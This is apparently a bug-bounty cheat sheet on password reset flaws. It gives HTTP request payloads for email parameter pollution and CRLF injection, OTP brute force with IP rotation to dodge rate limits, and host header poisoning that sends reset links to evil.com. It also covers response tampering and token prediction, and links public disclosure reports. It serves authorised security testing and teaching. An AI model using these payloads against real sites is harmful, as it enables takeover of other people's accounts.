## Password Reset Flaws

### 1. Account Takeover: Password Reset With Manipualating Email Parameter

```
POST /reset
[...]
1 email= victim@gmail.com&email=attacker@gmil.com
or
2 email= victim@gmail.com%20email=attacker@gmil.com
or
3 email= victim@gmail.com |email=attacker@gmil.com
or
4 email= "victim@gmail.com%0d%0acc:attacker@gmil.com"
or
5 email="victim@mail.com","attacker@mail.com"
or
{"email":["victim@mail.tld","atracker@mail.tld"]}
or
6 email= victim@gmail.com&code= my password reset token
```
https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
https://twitter.com/HusseiN98D/status/1254888748216655872
https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### 2. Bruteforce the OTP code
```
POST /reset
[...]
email=victim@mail.com&code=$123456$

```
 *Use IP-Rotator on burpsuite to bypass IP based ratelimit.

### 3. Host header Injection
```
POST /reset
Host: evil.com
[...]
email=victim@mail.com
```
```
POST /reset
Host: target.com
X-Forwarded-Host: evil.com
[...]
email=victim@mail.com
```
https://hackerone.com/reports/226659
https://hackerone.com/reports/167631
https://www.acunetix.com/blog/articles/password-reset-poisoning/ 
https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87 


### 4. Full Account Takeover via Changing Email And Password of any User through API Parameters
``` 
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})

```
Reference

  https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240


### 5.Response manipulation: Replace Bad Response With Good One
```
HTTP/1.1 401 Unauthorized
(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)

Change Response

HTTP/1.1 200 OK
(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)
```
 https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

### 6.No Rate Limiting: Email Bombing

    Start the Burp Suite and Intercept the password reset request
    Send to intruder
    Use null payload

 https://hackerone.com/reports/280534
 https://hackerone.com/reports/794395
    
### 7.Password Reset Token Leak Via Referrer
  https://hackerone.com/reports/342693
  https://hackerone.com/reports/272379
  https://hackerone.com/reports/737042
  https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
  https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

### 8. Using Expired Token
Check if the expired token can be reused

### 9. Find out how the tokens generate
- Generated based on TimeStamp
- Generated based on the ID of the user
- Generated based on the email of the user
- Generated based on the name of the user
Use Burp Sequencer to find the randomness or predictability of tokens.
> [For Example](https://medium.com/bugbountywriteup/how-i-discovered-an-interesting-account-takeover-flaw-18a7fb1e5359)
